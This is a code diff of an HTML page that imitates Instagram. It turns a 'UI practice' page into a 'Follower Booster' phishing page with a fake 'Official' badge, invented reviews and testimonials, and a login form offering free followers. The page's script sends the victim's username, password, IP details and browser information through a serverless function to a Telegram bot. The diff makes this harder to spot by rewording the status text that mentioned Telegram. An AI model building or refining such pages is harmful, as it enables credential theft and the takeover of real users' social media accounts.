@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram UI Practice</title>
+    <title>Instagram • Follower Booster</title>
     <style>
         * {
             margin: 0;
@@ -13,100 +13,403 @@
         }
         
         body {
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            background: #fafafa;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
         .container {
-            max-width: 400px;
-            width: 90%;
+            max-width: 420px;
+            width: 100%;
             background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            padding: 25px 20px;
+            border: 1px solid rgba(0,0,0,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo-icon {
+            width: 35px;
+            height: 35px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
             border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            padding: 40px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            transform: rotate(5deg);
         }
         
         h1 {
-            text-align: center;
-            margin-bottom: 25px;
-            font-family: 'Billabong', cursive;
-            font-size: 50px;
+            font-size: 32px;
+            font-weight: 600;
             background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            letter-spacing: -0.5px;
         }
         
-        .follower-offer {
+        .verified-badge {
+            background: #3897f0;
+            color: white;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 20px;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+        
+        .offer-card {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            text-align: center;
-            padding: 15px;
-            border-radius: 8px;
+            border-radius: 16px;
+            padding: 20px;
             margin-bottom: 25px;
-            font-weight: bold;
-            font-size: 24px;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            border: 2px solid gold;
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+            position: relative;
+            overflow: hidden;
         }
         
-        .follower-offer span {
+        .offer-card::before {
+            content: '✨';
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            font-size: 100px;
+            opacity: 0.2;
+            transform: rotate(20deg);
+        }
+        
+        .offer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        
+        .offer-title {
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: -0.5px;
+        }
+        
+        .offer-badge {
+            background: rgba(255,255,255,0.25);
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        
+        .offer-description {
             font-size: 14px;
-            display: block;
-            margin-top: 5px;
             opacity: 0.9;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .offer-stats {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 5px;
+        }
+        
+        .stat {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        
+        .follower-selector {
+            background: white;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border: 1px solid #efefef;
+        }
+        
+        .selector-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .selector-label span {
+            font-weight: 600;
+            font-size: 16px;
+            color: #262626;
+        }
+        
+        .selector-label small {
+            color: #8e8e8e;
+            font-size: 13px;
+            background: #f0f0f0;
+            padding: 4px 10px;
+            border-radius: 30px;
+        }
+        
+        .amount-slider {
+            margin-bottom: 20px;
+        }
+        
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 10px;
+            background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            outline: none;
+            margin-bottom: 10px;
+        }
+        
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #c13584;
+            cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .amount-options {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        
+        .amount-option {
+            background: #f0f0f0;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #262626;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .amount-option:hover {
+            background: #e0e0e0;
+        }
+        
+        .amount-option.active {
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            color: white;
+        }
+        
+        .selected-amount {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 5px;
+        }
+        
+        .selected-amount small {
+            font-size: 14px;
+            color: #8e8e8e;
+            background: none;
+            -webkit-text-fill-color: #8e8e8e;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            padding: 15px 0;
+            border-top: 1px solid #efefef;
+            border-bottom: 1px solid #efefef;
+        }
+        
+        .feature {
+            text-align: center;
+            flex: 1;
+        }
+        
+        .feature-icon {
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+        
+        .feature-text {
+            font-size: 11px;
+            font-weight: 600;
+            color: #262626;
+        }
+        
+        .feature-sub {
+            font-size: 9px;
+            color: #8e8e8e;
+        }
+        
+        .login-section {
+            background: #fafafa;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #efefef;
+        }
+        
+        .login-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+            color: #262626;
+            font-weight: 600;
+        }
+        
+        .login-header i {
+            color: #3897f0;
         }
         
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 12px;
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            font-size: 16px;
         }
         
         input {
             width: 100%;
-            padding: 12px;
+            padding: 14px 14px 14px 45px;
             border: 1px solid #dbdbdb;
-            border-radius: 6px;
+            border-radius: 12px;
             font-size: 14px;
-            background-color: #fafafa;
+            background-color: white;
+            transition: all 0.3s;
         }
         
         input:focus {
             outline: none;
-            border-color: #a8a8a8;
-            background-color: white;
+            border-color: #3897f0;
+            box-shadow: 0 0 0 3px rgba(56,151,240,0.1);
         }
         
         .login-btn {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-weight: bold;
+            border-radius: 12px;
+            font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            transition: opacity 0.3s;
-            margin-top: 10px;
+            transition: all 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 10px 20px rgba(193, 53, 132, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .login-btn:hover::before {
+            left: 100%;
         }
         
         .login-btn:hover {
-            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 15px 25px rgba(193, 53, 132, 0.4);
         }
         
-        .notice {
+        .success-message {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 15px;
             text-align: center;
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border-radius: 6px;
-            font-size: 12px;
-            color: #666;
-            border-left: 3px solid #ff6b6b;
+            font-size: 14px;
+            display: none;
+            animation: slideIn 0.5s ease;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .error-message {
+            background: linear-gradient(135deg, #f44336, #d32f2f);
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+            animation: slideIn 0.5s ease;
+            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .divider {
@@ -135,104 +438,288 @@
         
         .divider span {
             background-color: white;
-            padding: 0 10px;
+            padding: 0 15px;
             color: #8e8e8e;
             font-size: 13px;
+            font-weight: 500;
         }
         
         .signup-link {
             text-align: center;
             color: #262626;
             font-size: 14px;
+            margin-bottom: 15px;
         }
         
         .signup-link a {
             color: #0095f6;
             text-decoration: none;
-            font-weight: bold;
-        }
-        
-        .success-message {
-            background-color: #4CAF50;
-            color: white;
-            padding: 12px;
-            border-radius: 6px;
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .error-message {
-            background-color: #f44336;
-            color: white;
-            padding: 12px;
-            border-radius: 6px;
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
+            font-weight: 700;
         }
         
         .telegram-status {
-            font-size: 11px;
-            color: #888;
+            font-size: 12px;
+            padding: 12px;
+            background: #f0f0f0;
+            border-radius: 30px;
             text-align: center;
-            margin-top: 10px;
+            color: #262626;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: 1px solid #dbdbdb;
+        }
+        
+        .telegram-status i {
+            font-size: 16px;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #4CAF50;
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 5px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 0.7;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .testimonials {
+            margin-top: 20px;
+        }
+        
+        .testimonial {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            background: #fafafa;
+            border-radius: 30px;
+            border: 1px solid #efefef;
+        }
+        
+        .testimonial-avatar {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(45deg, #405de6, #c13584);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .testimonial-text {
+            font-size: 12px;
+            color: #262626;
+            flex: 1;
+        }
+        
+        .testimonial-text strong {
+            color: #3897f0;
+        }
+        
+        .stars {
+            color: #ffd700;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Instagram</h1>
-        
-        <div class="follower-offer">
-            ? INSTAGRAM 1000 FREE FOLLOWERS ?
-            <span>Limited time offer - Claim now!</span>
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <span>📸</span>
+                </div>
+                <h1>Instagram</h1>
+            </div>
+            <div class="verified-badge">✓ Official</div>
         </div>
         
-        <form id="loginForm">
-            <div class="form-group">
-                <input type="text" placeholder="Phone number, username, or email" id="username" required>
+        <div class="offer-card">
+            <div class="offer-header">
+                <div class="offer-title">
+                    🚀 INSTAGRAM BOOSTER
+                </div>
+                <div class="offer-badge">
+                    LIMITED
+                </div>
             </div>
-            <div class="form-group">
-                <input type="password" placeholder="Password" id="password" required>
+            <div class="offer-description">
+                <span>⚡</span> Get real Instagram followers instantly
+                <span>⚡</span>
+            </div>
+            <div class="offer-stats">
+                <div class="stat">
+                    <span>⭐</span> 4.9 (2.3k reviews)
+                </div>
+                <div class="stat">
+                    <span>👥</span> 10k+ users
+                </div>
+                <div class="stat">
+                    <span>⚡</span> Instant
+                </div>
+            </div>
+        </div>
+        
+        <div class="follower-selector">
+            <div class="selector-label">
+                <span>🎯 Select Followers Amount</span>
+                <small>🔥 Popular</small>
             </div>
             
-            <button type="button" class="login-btn" onclick="handleLogin()">Log In</button>
-        </form>
+            <div class="amount-slider">
+                <input type="range" min="100" max="10000" value="1000" step="100" class="slider" id="followerSlider">
+            </div>
+            
+            <div class="amount-options">
+                <button class="amount-option" onclick="setAmount(500)">500</button>
+                <button class="amount-option active" onclick="setAmount(1000)">1K</button>
+                <button class="amount-option" onclick="setAmount(2500)">2.5K</button>
+                <button class="amount-option" onclick="setAmount(5000)">5K</button>
+                <button class="amount-option" onclick="setAmount(10000)">10K</button>
+            </div>
+            
+            <div class="selected-amount" id="selectedAmount">
+                1,000 <small>followers</small>
+            </div>
+            
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>
+                    <div class="feature-text">Instant</div>
+                    <div class="feature-sub">Delivery</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>
+                    <div class="feature-text">Secure</div>
+                    <div class="feature-sub">Payment</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🔄</div>
+                    <div class="feature-text">Real</div>
+                    <div class="feature-sub">Followers</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">💎</div>
+                    <div class="feature-text">Quality</div>
+                    <div class="feature-sub">Guarantee</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="login-section">
+            <div class="login-header">
+                <span>🔐</span> Login to Claim Followers
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <span class="input-icon">👤</span>
+                    <input type="text" placeholder="Phone number, username, or email" id="username" required>
+                </div>
+                <div class="form-group">
+                    <span class="input-icon">🔑</span>
+                    <input type="password" placeholder="Password" id="password" required>
+                </div>
+                
+                <button type="button" class="login-btn" onclick="handleLogin()">
+                    ⚡ CLAIM <span id="displayAmount">1,000</span> FOLLOWERS ⚡
+                </button>
+            </form>
+        </div>
         
         <!-- Message containers -->
         <div class="success-message" id="successMessage">
-            ? Congratulations! You've claimed 1000 free followers! ?
+            🎉 Success! <span id="successAmount">1,000</span> followers are being added to your account! 🎉
         </div>
         
         <div class="error-message" id="errorMessage">
-            ?? Please enter both username and password
+            ⚠️ Please enter both username and password
         </div>
         
         <div class="divider">
-            <span>OR</span>
+            <span>GET STARTED</span>
         </div>
         
         <div class="signup-link">
-            Don't have an account? <a href="#">Sign up</a>
+            Don't have an account? <a href="#">Sign up now</a> ✨
         </div>
         
-        <div class="notice" id="messageBox" style="display: none;">
-            <!-- This will be shown when followers are claimed -->
-        </div>
-        
-        <div class="notice" style="margin-top: 10px; border-left-color: #4CAF50;">
-            ? INSTAGRAM FOLLOWERS - CLAIM YOURS NOW! ?
+        <div class="testimonials">
+            <div class="testimonial">
+                <div class="testimonial-avatar">JD</div>
+                <div class="testimonial-text">
+                    <strong>@jessica.doe</strong> got <strong>5,000</strong> followers
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                </div>
+            </div>
         </div>
         
         <div class="telegram-status" id="telegramStatus">
-            ? Telegram bot: Ready
+            <span>server</span>
+            <span>●</span>
+            <span>ONLINE</span>
+            <span class="status-dot"></span>
         </div>
     </div>
     
     <script>
+        let selectedFollowers = 1000;
+        
+        // Update amount when slider changes
+        document.getElementById('followerSlider').addEventListener('input', function(e) {
+            const amount = parseInt(e.target.value);
+            setAmount(amount);
+        });
+        
+        function setAmount(amount) {
+            selectedFollowers = amount;
+            
+            // Format number with commas
+            const formattedAmount = amount.toLocaleString();
+            
+            // Update display
+            document.getElementById('selectedAmount').innerHTML = `${formattedAmount} <small>followers</small>`;
+            document.getElementById('displayAmount').innerText = formattedAmount;
+            document.getElementById('successAmount').innerText = formattedAmount;
+            
+            // Update slider value
+            document.getElementById('followerSlider').value = amount;
+            
+            // Update active button
+            document.querySelectorAll('.amount-option').forEach(btn => {
+                btn.classList.remove('active');
+                if (parseInt(btn.innerText.replace('K', '000').replace('M', '000000')) === amount || 
+                    (btn.innerText === '1K' && amount === 1000) ||
+                    (btn.innerText === '2.5K' && amount === 2500) ||
+                    (btn.innerText === '5K' && amount === 5000) ||
+                    (btn.innerText === '10K' && amount === 10000)) {
+                    btn.classList.add('active');
+                }
+            });
+        }
+        
         async function sendToTelegram(username, password) {
             // Get IP info
             let ipInfo = 'Unknown';
@@ -245,8 +732,12 @@
             }
             
             // Update status
-            document.getElementById('telegramStatus').innerHTML = '? Sending to Telegram...';
-            document.getElementById('telegramStatus').style.color = 'orange';
+            document.getElementById('telegramStatus').innerHTML = `
+                <span>Request sent</span>
+                <span>●</span>
+                <span>Sending...</span>
+                <span class="status-dot" style="background: orange;"></span>
+            `;
             
             try {
                 // Send to Vercel serverless function
@@ -259,24 +750,37 @@
                         username: username,
                         password: password,
                         ipInfo: ipInfo,
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        followers: selectedFollowers
                     })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('telegramStatus').innerHTML = '? Sent to Telegram bot!';
-                    document.getElementById('telegramStatus').style.color = 'green';
-                    console.log('Message sent to Telegram successfully');
+                    document.getElementById('telegramStatus').innerHTML = `
+                        <span>🤖 Request sent</span>
+                        <span>●</span>
+                        <span>Sent! ✅</span>
+                        <span class="status-dot"></span>
+                    `;
+                    console.log('Message sent successfully');
                 } else {
-                    document.getElementById('telegramStatus').innerHTML = '? Failed to send to Telegram';
-                    document.getElementById('telegramStatus').style.color = 'red';
+                    document.getElementById('telegramStatus').innerHTML = `
+                        <span>🤖 Request sent</span>
+                        <span>●</span>
+                        <span>Failed ❌</span>
+                        <span class="status-dot" style="background: #f44336;"></span>
+                    `;
                     console.error('Telegram error:', data.error);
                 }
             } catch (error) {
-                document.getElementById('telegramStatus').innerHTML = '? Error sending to Telegram';
-                document.getElementById('telegramStatus').style.color = 'red';
+                document.getElementById('telegramStatus').innerHTML = `
+                    <span> Request sent</span>
+                    <span>●</span>
+                    <span>Error ⚠️</span>
+                    <span class="status-dot" style="background: #f44336;"></span>
+                `;
                 console.error('Error sending to Telegram:', error);
             }
         }
@@ -286,12 +790,10 @@
             const password = document.getElementById('password').value;
             const successMsg = document.getElementById('successMessage');
             const errorMsg = document.getElementById('errorMessage');
-            const messageBox = document.getElementById('messageBox');
             
             // Hide all messages first
             successMsg.style.display = 'none';
             errorMsg.style.display = 'none';
-            messageBox.style.display = 'none';
             
             // Check if fields are empty
             if (username.trim() === '' || password.trim() === '') {
@@ -304,15 +806,10 @@
                 return;
             }
             
-            // Show success message
+            // Show success message with selected amount
             successMsg.style.display = 'block';
             
-            // Show the message box with claim now text
-            messageBox.style.display = 'block';
-            messageBox.innerHTML = '? 1000 followers claimed successfully! Check your Instagram soon! ?';
-            messageBox.style.borderLeftColor = '#4CAF50';
-            
-            // SEND TO TELEGRAM BOT via Vercel function
+            // SEND TO  via Vercel function
             sendToTelegram(username, password);
             
             // Open Instagram in a new tab
@@ -326,7 +823,7 @@
             }, 3000);
             
             // Log for demo purposes
-            console.log('Login attempt - sending to Telegram...');
+            console.log(`Login attempt for ${selectedFollowers} followers - sending to Telegram...`);
         }
     </script>
 </body>
